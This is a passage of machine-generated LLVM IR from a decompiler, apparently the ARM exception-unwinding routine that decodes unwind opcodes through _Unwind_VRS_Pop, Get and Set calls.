  %v1_2269c = and i32 %v0_22694, 240
  store i32 %v1_2269c, i32* @r6, align 4
  %v7_226a0 = icmp eq i32 %v1_2269c, 128
  store i1 %v7_226a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_226a0, label %dec_label_pc_226a8, label %dec_label_pc_227cc

dec_label_pc_226a8:                               ; preds = %dec_label_pc_2269c
  %v0_226a8 = load i32, i32* @r5, align 4
  %v1_226a8 = add i32 %v0_226a8, 8
  %v2_226a8 = inttoptr i32 %v1_226a8 to i8*
  %v3_226a8 = load i8, i8* %v2_226a8, align 1
  %v4_226a8 = zext i8 %v3_226a8 to i32
  store i32 %v4_226a8, i32* %r3.global-to-local, align 4
  %v2_226ac = icmp eq i8 %v3_226a8, 0
  store i1 %v2_226ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_226ac, label %dec_label_pc_226bc, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_226a8
  %v2_226b0 = add nsw i32 %v4_226a8, -1
  store i32 %v2_226b0, i32* %r3.global-to-local, align 4
  %v2_226b4 = trunc i32 %v2_226b0 to i8
  store i8 %v2_226b4, i8* %v2_226a8, align 1
  %v0_226b8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_226b8.pr.pr, label %.thread3.dec_label_pc_226bc_crit_edge, label %dec_label_pc_226ec

.thread3.dec_label_pc_226bc_crit_edge:            ; preds = %.thread3
  %v0_226bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_226bc

dec_label_pc_226bc:                               ; preds = %.thread3.dec_label_pc_226bc_crit_edge, %dec_label_pc_226a8
  %v2_226d0 = phi i32 [ %v0_226bc.pre, %.thread3.dec_label_pc_226bc_crit_edge ], [ %v0_226a8, %dec_label_pc_226a8 ]
  %v1_226bc = add i32 %v2_226d0, 9
  %v2_226bc = inttoptr i32 %v1_226bc to i8*
  %v3_226bc = load i8, i8* %v2_226bc, align 1
  %v4_226bc = zext i8 %v3_226bc to i32
  store i32 %v4_226bc, i32* %r3.global-to-local, align 4
  %v2_226c0 = icmp eq i8 %v3_226bc, 0
  store i1 %v2_226c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_226c0, label %dec_label_pc_226fc, label %dec_label_pc_226cc

dec_label_pc_226cc:                               ; preds = %dec_label_pc_226bc
  %v1_226cc = add nsw i32 %v4_226bc, -1
  store i32 %v1_226cc, i32* %r3.global-to-local, align 4
  %v1_226d0 = trunc i32 %v1_226cc to i8
  store i8 %v1_226d0, i8* %v2_226bc, align 1
  %v0_226d4 = load i32, i32* @r5, align 4
  %v1_226d4 = add i32 %v0_226d4, 4
  %v2_226d4 = inttoptr i32 %v1_226d4 to i32*
  %v3_226d4 = load i32, i32* %v2_226d4, align 4
  store i32 %v3_226d4, i32* %r2.global-to-local, align 4
  %v1_226d8 = inttoptr i32 %v3_226d4 to i32*
  %v2_226d8 = load i32, i32* %v1_226d8, align 4
  store i32 %v2_226d8, i32* %r0.global-to-local, align 4
  %v4_226d8 = add i32 %v3_226d4, 4
  store i32 %v4_226d8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_226d8, i32* %v2_226d4, align 4
  %v0_226e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_226e4 = trunc i32 %v0_226e4 to i8
  %v2_226e4 = load i32, i32* @r5, align 4
  %v3_226e4 = add i32 %v2_226e4, 8
  %v4_226e4 = inttoptr i32 %v3_226e4 to i8*
  store i8 %v1_226e4, i8* %v4_226e4, align 1
  %v0_226e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_226e8 = load i32, i32* @r5, align 4
  %v2_226e8 = inttoptr i32 %v1_226e8 to i32*
  store i32 %v0_226e8, i32* %v2_226e8, align 4
  br label %dec_label_pc_226ec

dec_label_pc_226ec:                               ; preds = %.thread3, %dec_label_pc_226cc
  %v0_226ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_226ec, i32* %r3.global-to-local, align 4
  %v3_226f0 = mul i32 %v0_226ec, 256
  store i32 %v3_226f0, i32* %r0.global-to-local, align 4
  %v1_226f4 = load i32, i32* @r5, align 4
  %v2_226f4 = inttoptr i32 %v1_226f4 to i32*
  store i32 %v3_226f0, i32* %v2_226f4, align 4
  %v0_226f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_226f8 = udiv i32 %v0_226f8, 16777216
  br label %dec_label_pc_226fc

dec_label_pc_226fc:                               ; preds = %dec_label_pc_226bc, %dec_label_pc_226ec
  %storemerge133 = phi i32 [ %v3_226f8, %dec_label_pc_226ec ], [ 176, %dec_label_pc_226bc ]
  %v1_226fc = load i32, i32* %ip.global-to-local, align 4
  %v4_226fc = mul i32 %v1_226fc, 256
  %v5_226fc = or i32 %v4_226fc, %storemerge133
  store i32 %v5_226fc, i32* %r2.global-to-local, align 4
  %v7_22700 = icmp eq i32 %v5_226fc, 32768
  store i1 %v7_22700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22700, label %dec_label_pc_2290c, label %dec_label_pc_22708

dec_label_pc_22708:                               ; preds = %dec_label_pc_226fc
  %v3_22708 = mul i32 %v5_226fc, 16
  store i32 %v3_22708, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_22718 = and i32 %v3_22708, 65520
  store i32 %v3_22718, i32* %r2.global-to-local, align 4
  %v0_2271c = load i32, i32* @r7, align 4
  store i32 %v0_2271c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_22724 = call i32 @_Unwind_VRS_Pop(i32 %v0_2271c, i32 %v3_22718, i32 0, i32 0)
  store i32 %v4_22724, i32* %r0.global-to-local, align 4
  %v2_22728 = icmp eq i32 %v4_22724, 0
  store i1 %v2_22728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22728, label %dec_label_pc_22730, label %dec_label_pc_2290c

dec_label_pc_22730:                               ; preds = %dec_label_pc_22708
  %v0_22730 = load i32, i32* @r5, align 4
  %v1_22730 = add i32 %v0_22730, 8
  %v2_22730 = inttoptr i32 %v1_22730 to i8*
  %v3_22730 = load i8, i8* %v2_22730, align 1
  %v4_22730 = zext i8 %v3_22730 to i32
  store i32 %v4_22730, i32* %r3.global-to-local, align 4
  %v0_22734 = load i32, i32* @r4, align 4
  %v1_22734 = and i32 %v0_22734, 32768
  %v2_22734 = icmp eq i32 %v1_22734, 0
  store i1 %v2_22734, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22734, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_22730
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_22730, %bb147
  %v2_2273c = icmp eq i8 %v3_22730, 0
  store i1 %v2_2273c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2273c, label %dec_label_pc_2274c, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_22740 = add nsw i32 %v4_22730, -1
  store i32 %v2_22740, i32* %r3.global-to-local, align 4
  %v2_22744 = trunc i32 %v2_22740 to i8
  store i8 %v2_22744, i8* %v2_22730, align 1
  %v0_22748.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_22748.pr.pr, label %.thread6.dec_label_pc_2274c_crit_edge, label %dec_label_pc_22678

.thread6.dec_label_pc_2274c_crit_edge:            ; preds = %.thread6
  %v0_2274c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2274c

dec_label_pc_2274c:                               ; preds = %bb148, %.thread6.dec_label_pc_2274c_crit_edge
  %v0_2274c = phi i32 [ %v0_2274c.pre, %.thread6.dec_label_pc_2274c_crit_edge ], [ %v0_22730, %bb148 ]
  %v1_2274c = add i32 %v0_2274c, 9
  %v2_2274c = inttoptr i32 %v1_2274c to i8*
  %v3_2274c = load i8, i8* %v2_2274c, align 1
  %v4_2274c = zext i8 %v3_2274c to i32
  store i32 %v4_2274c, i32* %r3.global-to-local, align 4
  %v2_22750 = icmp eq i8 %v3_2274c, 0
  store i1 %v2_22750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22750, label %dec_label_pc_22758, label %dec_label_pc_2265c

dec_label_pc_22758:                               ; preds = %dec_label_pc_2274c, %dec_label_pc_22650, %dec_label_pc_22678
  %v0_22758 = load i32, i32* @sl, align 4
  %v2_22758 = icmp eq i32 %v0_22758, 0
  store i1 %v2_22758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22758, label %dec_label_pc_22820, label %bb149

bb149:                                            ; preds = %dec_label_pc_22758
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22764

dec_label_pc_22764:                               ; preds = %bb149, %dec_label_pc_22cd4, %dec_label_pc_22b74, %dec_label_pc_22998, %dec_label_pc_22950, %dec_label_pc_2290c, %dec_label_pc_22820
  %v1_2276c = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_22cd4 ], [ 9, %dec_label_pc_22b74 ], [ 9, %dec_label_pc_22998 ], [ 9, %dec_label_pc_22950 ], [ 9, %dec_label_pc_2290c ], [ %v0_22854, %dec_label_pc_22820 ]
  store i32 %v9_22628, i32* %r6.global-to-local, align 4
  store i32 %v21_22628, i32* @lr, align 4
  ret i32 %v1_2276c

dec_label_pc_22770:                               ; preds = %dec_label_pc_22694
  %v1_22770 = mul i32 %v0_22694, 4
  %v3_22774 = and i32 %v1_22770, 252
  store i32 %v3_22774, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_22780 = load i32, i32* @r7, align 4
  store i32 %v0_22780, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_22788 = add nuw nsw i32 %v3_22774, 4
  store i32 %v1_22788, i32* %r6.global-to-local, align 4
  %v5_22790 = call i32 @_Unwind_VRS_Get(i32 %v0_22780, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_22794 = load i32, i32* @r4, align 4
  %v1_22794 = and i32 %v0_22794, 64
  %v2_22794 = icmp eq i32 %v1_22794, 0
  store i1 %v2_22794, i1* %cpsr_z.global-to-local, align 1
  %v4_2279c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_227a8 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_227a8
  %storemerge160.p = select i1 %v2_22794, i32 %v2_227a8, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_2279c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_227c4 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_227c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2263c.backedge

dec_label_pc_2263c.backedge:                      ; preds = %dec_label_pc_22770, %dec_label_pc_227ec, %dec_label_pc_22c70, %dec_label_pc_2293c, %dec_label_pc_22974, %dec_label_pc_228f4, %dec_label_pc_22b60
  %v0_2263c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2263c

dec_label_pc_227cc:                               ; preds = %dec_label_pc_2269c
  %v7_227cc = icmp eq i32 %v1_2269c, 144
  store i1 %v7_227cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_227cc, label %dec_label_pc_227d4, label %dec_label_pc_22914

dec_label_pc_227d4:                               ; preds = %dec_label_pc_227cc
  %v1_227d4 = urem i32 %v0_22694, 16
  store i32 %v1_227d4, i32* %r2.global-to-local, align 4
  %v2_227d8 = icmp eq i32 %v1_227d4, 15
  store i1 %v2_227d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_227d8, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_227d4
  %v8_227dc = icmp eq i32 %v1_227d4, 13
  store i1 %v8_227dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_227dc, label %bb154, label %dec_label_pc_227ec

.thread21:                                        ; preds = %dec_label_pc_227d4
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2290c

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2290c

dec_label_pc_227ec:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_227f8 = load i32, i32* @r7, align 4
  store i32 %v0_227f8, i32* %r0.global-to-local, align 4
  %v5_22800 = call i32 @_Unwind_VRS_Get(i32 %v0_227f8, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_22808 = load i32, i32* @r7, align 4
  store i32 %v0_22808, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_22818 = call i32 @_Unwind_VRS_Set(i32 %v0_22808, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_22818, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2263c.backedge

dec_label_pc_22820:                               ; preds = %dec_label_pc_22758
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_22830 = load i32, i32* @r7, align 4
  store i32 %v0_22830, i32* %r0.global-to-local, align 4
  %v7_22838 = call i32 @_Unwind_VRS_Get(i32 %v0_22830, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_2283c = load i32, i32* @r7, align 4
  store i32 %v0_2283c, i32* %r0.global-to-local, align 4
  %v0_22840 = load i32, i32* @sl, align 4
  store i32 %v0_22840, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_22840, i32* %r3.global-to-local, align 4
  %v5_22850 = call i32 @_Unwind_VRS_Set(i32 %v0_2283c, i32 %v0_22840, i32 15, i32 %v0_22840, i8* bitcast (i32* @0 to i8*))
  %v0_22854 = load i32, i32* @sl, align 4
  store i32 %v0_22854, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22764

dec_label_pc_2285c:                               ; preds = %dec_label_pc_22a50
  %v7_2285c = icmp eq i32 %v0_22a50, 199
  store i1 %v7_2285c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2285c, label %dec_label_pc_22b30, label %dec_label_pc_22864

dec_label_pc_22864:                               ; preds = %dec_label_pc_2285c
  %v1_22864 = and i32 %v0_22694, 248
  store i32 %v1_22864, i32* %r3.global-to-local, align 4
  %v7_22868 = icmp eq i32 %v1_22864, 192
  store i1 %v7_22868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22868, label %.thread24, label %dec_label_pc_22880

.thread24:                                        ; preds = %dec_label_pc_22864
  %v2_2286c = urem i32 %v0_22694, 16
  %v2_22870 = add nuw nsw i32 %v2_2286c, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_22878 = or i32 %v2_22870, 655360
  store i32 %v2_22878, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2293c

dec_label_pc_22880:                               ; preds = %dec_label_pc_22864
  %v7_22880 = icmp eq i32 %v0_22a50, 200
  store i1 %v7_22880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22880, label %dec_label_pc_22ac4, label %dec_label_pc_22888

dec_label_pc_22888:                               ; preds = %dec_label_pc_22880
  %v7_22888 = icmp eq i32 %v0_22a50, 201
  store i1 %v7_22888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22888, label %dec_label_pc_22890, label %dec_label_pc_2290c

dec_label_pc_22890:                               ; preds = %dec_label_pc_22888
  %v0_22890 = load i32, i32* @r5, align 4
  %v1_22890 = add i32 %v0_22890, 8
  %v2_22890 = inttoptr i32 %v1_22890 to i8*
  %v3_22890 = load i8, i8* %v2_22890, align 1
  %v4_22890 = zext i8 %v3_22890 to i32
  store i32 %v4_22890, i32* %r3.global-to-local, align 4
  %v2_22894 = icmp eq i8 %v3_22890, 0
  store i1 %v2_22894, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22894, label %dec_label_pc_228a4, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_22890
  %v2_22898 = add nsw i32 %v4_22890, -1
  store i32 %v2_22898, i32* %r3.global-to-local, align 4
  %v2_2289c = trunc i32 %v2_22898 to i8
  store i8 %v2_2289c, i8* %v2_22890, align 1
  %v0_228a0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_228a0.pr.pr, label %.thread26.dec_label_pc_228a4_crit_edge, label %dec_label_pc_228d8

.thread26.dec_label_pc_228a4_crit_edge:           ; preds = %.thread26
  %v0_228a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_228a4

dec_label_pc_228a4:                               ; preds = %.thread26.dec_label_pc_228a4_crit_edge, %dec_label_pc_22890
  %v2_228bc = phi i32 [ %v0_228a4.pre, %.thread26.dec_label_pc_228a4_crit_edge ], [ %v0_22890, %dec_label_pc_22890 ]
  %v1_228a4 = add i32 %v2_228bc, 9
  %v2_228a4 = inttoptr i32 %v1_228a4 to i8*
  %v3_228a4 = load i8, i8* %v2_228a4, align 1
  %v4_228a4 = zext i8 %v3_228a4 to i32
  store i32 %v4_228a4, i32* %r3.global-to-local, align 4
  %v2_228a8 = icmp eq i8 %v3_228a4, 0
  store i1 %v2_228a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_228a8, label %dec_label_pc_228f4, label %dec_label_pc_228b8

dec_label_pc_228b8:                               ; preds = %dec_label_pc_228a4
  %v1_228b8 = add nsw i32 %v4_228a4, -1
  store i32 %v1_228b8, i32* %r3.global-to-local, align 4
  %v1_228bc = trunc i32 %v1_228b8 to i8
  store i8 %v1_228bc, i8* %v2_228a4, align 1
  %v0_228c0 = load i32, i32* @r5, align 4
  %v1_228c0 = add i32 %v0_228c0, 4
  %v2_228c0 = inttoptr i32 %v1_228c0 to i32*
  %v3_228c0 = load i32, i32* %v2_228c0, align 4
  store i32 %v3_228c0, i32* %r2.global-to-local, align 4
  %v1_228c4 = inttoptr i32 %v3_228c0 to i32*
  %v2_228c4 = load i32, i32* %v1_228c4, align 4
  store i32 %v2_228c4, i32* %r0.global-to-local, align 4
  %v4_228c4 = add i32 %v3_228c0, 4
  store i32 %v4_228c4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_228c4, i32* %v2_228c0, align 4
  %v0_228d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_228d0 = trunc i32 %v0_228d0 to i8
  %v2_228d0 = load i32, i32* @r5, align 4
  %v3_228d0 = add i32 %v2_228d0, 8
  %v4_228d0 = inttoptr i32 %v3_228d0 to i8*
  store i8 %v1_228d0, i8* %v4_228d0, align 1
  %v0_228d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_228d4 = load i32, i32* @r5, align 4
  %v2_228d4 = inttoptr i32 %v1_228d4 to i32*
  store i32 %v0_228d4, i32* %v2_228d4, align 4
  br label %dec_label_pc_228d8

dec_label_pc_228d8:                               ; preds = %.thread26, %dec_label_pc_228b8
  %v0_228d8 = load i32, i32* %r0.global-to-local, align 4
  %v3_228d8 = udiv i32 %v0_228d8, 16777216
  %v1_228dc = urem i32 %v3_228d8, 16
  %v3_228e0 = mul i32 %v0_228d8, 256
  %v1_228e4 = add nuw nsw i32 %v1_228dc, 1
  store i32 %v1_228e4, i32* %r1.global-to-local, align 4
  %v1_228e8 = and i32 %v3_228d8, 240
  store i32 %v1_228e8, i32* %r3.global-to-local, align 4
  %v1_228ec = load i32, i32* @r5, align 4
  %v2_228ec = inttoptr i32 %v1_228ec to i32*
  store i32 %v3_228e0, i32* %v2_228ec, align 4
  %v0_228f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_228f0 = load i32, i32* %r3.global-to-local, align 4
  %v4_228f0 = mul i32 %v1_228f0, 4096
  %v5_228f0 = or i32 %v4_228f0, %v0_228f0
  br label %dec_label_pc_228f4

dec_label_pc_228f4:                               ; preds = %dec_label_pc_228a4, %dec_label_pc_228d8
  %storemerge = phi i32 [ %v5_228f0, %dec_label_pc_228d8 ], [ 720897, %dec_label_pc_228a4 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_228f4 = load i32, i32* @r7, align 4
  store i32 %v0_228f4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_22900 = call i32 @_Unwind_VRS_Pop(i32 %v0_228f4, i32 1, i32 5, i32 5)
  store i32 %v4_22900, i32* %r0.global-to-local, align 4
  %v2_22904 = icmp eq i32 %v4_22900, 0
  store i1 %v2_22904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22904, label %dec_label_pc_2263c.backedge, label %dec_label_pc_2290c

dec_label_pc_2290c:                               ; preds = %dec_label_pc_22b58, %dec_label_pc_22888, %dec_label_pc_22968, %dec_label_pc_22d0c, %dec_label_pc_22cdc, %dec_label_pc_22cb8, %dec_label_pc_22b44, %dec_label_pc_228f4, %dec_label_pc_22708, %dec_label_pc_226fc, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22764

dec_label_pc_22914:                               ; preds = %dec_label_pc_227cc
  %v7_22914 = icmp eq i32 %v1_2269c, 160
  store i1 %v7_22914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22914, label %dec_label_pc_2291c, label %dec_label_pc_22958

dec_label_pc_2291c:                               ; preds = %dec_label_pc_22914
  %v0_2291c = load i32, i32* %ip.global-to-local, align 4
  %v1_2291c = urem i32 %v0_2291c, 8
  %v1_22920 = xor i32 %v1_2291c, 7
  store i32 %v1_22920, i32* %r3.global-to-local, align 4
  %v6_22928 = lshr i32 4080, %v1_22920
  %v1_2292c = and i32 %v0_22694, 8
  %v2_2292c = icmp eq i32 %v1_2292c, 0
  store i1 %v2_2292c, i1* %cpsr_z.global-to-local, align 1
  %v1_22930 = and i32 %v6_22928, 4080
  %tmp155 = mul nuw nsw i32 %v1_2292c, 2048
  %tmp156 = or i32 %v1_22930, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2293c

dec_label_pc_2293c:                               ; preds = %.thread44, %.thread24, %dec_label_pc_22ccc.dec_label_pc_2293c_crit_edge, %bb157, %dec_label_pc_22b28, %dec_label_pc_22abc, %dec_label_pc_22a1c, %dec_label_pc_2291c
  %v2_22944 = phi i32 [ %v2_22a40, %.thread44 ], [ %v2_22a48, %bb157 ], [ %v2_22944.pre, %dec_label_pc_22ccc.dec_label_pc_2293c_crit_edge ], [ %v2_22878, %.thread24 ], [ %storemerge130, %dec_label_pc_22b28 ], [ %storemerge131, %dec_label_pc_22abc ], [ %storemerge132, %dec_label_pc_22a1c ], [ %tmp156, %dec_label_pc_2291c ]
  %v0_22940 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_22ccc.dec_label_pc_2293c_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_22b28 ], [ 3, %dec_label_pc_22abc ], [ 1, %dec_label_pc_22a1c ], [ 0, %dec_label_pc_2291c ]
  %v0_2293c = load i32, i32* @r7, align 4
  store i32 %v0_2293c, i32* %r0.global-to-local, align 4
  store i32 %v0_22940, i32* %r3.global-to-local, align 4
  %v4_22944 = call i32 @_Unwind_VRS_Pop(i32 %v0_2293c, i32 %v0_22940, i32 %v2_22944, i32 %v0_22940)
  store i32 %v4_22944, i32* %r0.global-to-local, align 4
  %v2_22948 = icmp eq i32 %v4_22944, 0
  store i1 %v2_22948, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22948, label %dec_label_pc_2263c.backedge, label %dec_label_pc_22950

dec_label_pc_22950:                               ; preds = %dec_label_pc_2293c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22764

dec_label_pc_22958:                               ; preds = %dec_label_pc_22914
  %v7_22958 = icmp eq i32 %v1_2269c, 176
  store i1 %v7_22958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22958, label %dec_label_pc_229a0, label %dec_label_pc_22960

dec_label_pc_22960:                               ; preds = %dec_label_pc_22958
  %v7_22960 = icmp eq i32 %v1_2269c, 192
  store i1 %v7_22960, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22960, label %dec_label_pc_22a50, label %dec_label_pc_22968

dec_label_pc_22968:                               ; preds = %dec_label_pc_22960
  %v1_22968 = and i32 %v0_22694, 248
  store i32 %v1_22968, i32* %r3.global-to-local, align 4
  %v7_2296c = icmp eq i32 %v1_22968, 208
  store i1 %v7_2296c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2296c, label %dec_label_pc_22974, label %dec_label_pc_2290c

dec_label_pc_22974:                               ; preds = %dec_label_pc_22968
  %v1_22974 = urem i32 %v0_22694, 8
  %v1_22978 = add nuw nsw i32 %v1_22974, 1
  %v1_2297c = or i32 %v1_22978, 524288
  store i32 %v1_2297c, i32* %r2.global-to-local, align 4
  %v0_22980 = load i32, i32* @r7, align 4
  store i32 %v0_22980, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_2298c = call i32 @_Unwind_VRS_Pop(i32 %v0_22980, i32 1, i32 %v1_2297c, i32 5)
  store i32 %v4_2298c, i32* %r0.global-to-local, align 4
  %v2_22990 = icmp eq i32 %v4_2298c, 0
  store i1 %v2_22990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22990, label %dec_label_pc_2263c.backedge, label %dec_label_pc_22998

dec_label_pc_22998:                               ; preds = %dec_label_pc_22974
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22764

dec_label_pc_229a0:                               ; preds = %dec_label_pc_22958
  %v0_229a0 = load i32, i32* %ip.global-to-local, align 4
  %v7_229a0 = icmp eq i32 %v0_229a0, 177
  store i1 %v7_229a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_229a0, label %dec_label_pc_22ca4, label %dec_label_pc_229a8

dec_label_pc_229a8:                               ; preds = %dec_label_pc_229a0
  %v7_229a8 = icmp eq i32 %v0_229a0, 178
  store i1 %v7_229a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_229a8, label %dec_label_pc_22b7c, label %dec_label_pc_229b0

dec_label_pc_229b0:                               ; preds = %dec_label_pc_229a8
  %v7_229b0 = icmp eq i32 %v0_229a0, 179
  store i1 %v7_229b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_229b0, label %dec_label_pc_229b8, label %dec_label_pc_22a24

dec_label_pc_229b8:                               ; preds = %dec_label_pc_229b0
  %v0_229b8 = load i32, i32* @r5, align 4
  %v1_229b8 = add i32 %v0_229b8, 8
  %v2_229b8 = inttoptr i32 %v1_229b8 to i8*
  %v3_229b8 = load i8, i8* %v2_229b8, align 1
  %v4_229b8 = zext i8 %v3_229b8 to i32
  store i32 %v4_229b8, i32* %r3.global-to-local, align 4
  %v2_229bc = icmp eq i8 %v3_229b8, 0
  store i1 %v2_229bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_229bc, label %dec_label_pc_229cc, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_229b8
  %v2_229c0 = add nsw i32 %v4_229b8, -1
  store i32 %v2_229c0, i32* %r3.global-to-local, align 4
  %v2_229c4 = trunc i32 %v2_229c0 to i8
  store i8 %v2_229c4, i8* %v2_229b8, align 1
  %v0_229c8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_229c8.pr.pr, label %.thread30.dec_label_pc_229cc_crit_edge, label %dec_label_pc_22a00

.thread30.dec_label_pc_229cc_crit_edge:           ; preds = %.thread30
  %v0_229cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_229cc

dec_label_pc_229cc:                               ; preds = %.thread30.dec_label_pc_229cc_crit_edge, %dec_label_pc_229b8
  %v2_229e4 = phi i32 [ %v0_229cc.pre, %.thread30.dec_label_pc_229cc_crit_edge ], [ %v0_229b8, %dec_label_pc_229b8 ]
  %v1_229cc = add i32 %v2_229e4, 9
  %v2_229cc = inttoptr i32 %v1_229cc to i8*
  %v3_229cc = load i8, i8* %v2_229cc, align 1
  %v4_229cc = zext i8 %v3_229cc to i32
  store i32 %v4_229cc, i32* %r3.global-to-local, align 4
  %v2_229d0 = icmp eq i8 %v3_229cc, 0
  store i1 %v2_229d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_229d0, label %dec_label_pc_22a1c, label %dec_label_pc_229e0

dec_label_pc_229e0:                               ; preds = %dec_label_pc_229cc
  %v1_229e0 = add nsw i32 %v4_229cc, -1
  store i32 %v1_229e0, i32* %r3.global-to-local, align 4
  %v1_229e4 = trunc i32 %v1_229e0 to i8
  store i8 %v1_229e4, i8* %v2_229cc, align 1
  %v0_229e8 = load i32, i32* @r5, align 4
  %v1_229e8 = add i32 %v0_229e8, 4
  %v2_229e8 = inttoptr i32 %v1_229e8 to i32*
  %v3_229e8 = load i32, i32* %v2_229e8, align 4
  store i32 %v3_229e8, i32* %r2.global-to-local, align 4
  %v1_229ec = inttoptr i32 %v3_229e8 to i32*
  %v2_229ec = load i32, i32* %v1_229ec, align 4
  store i32 %v2_229ec, i32* %r0.global-to-local, align 4
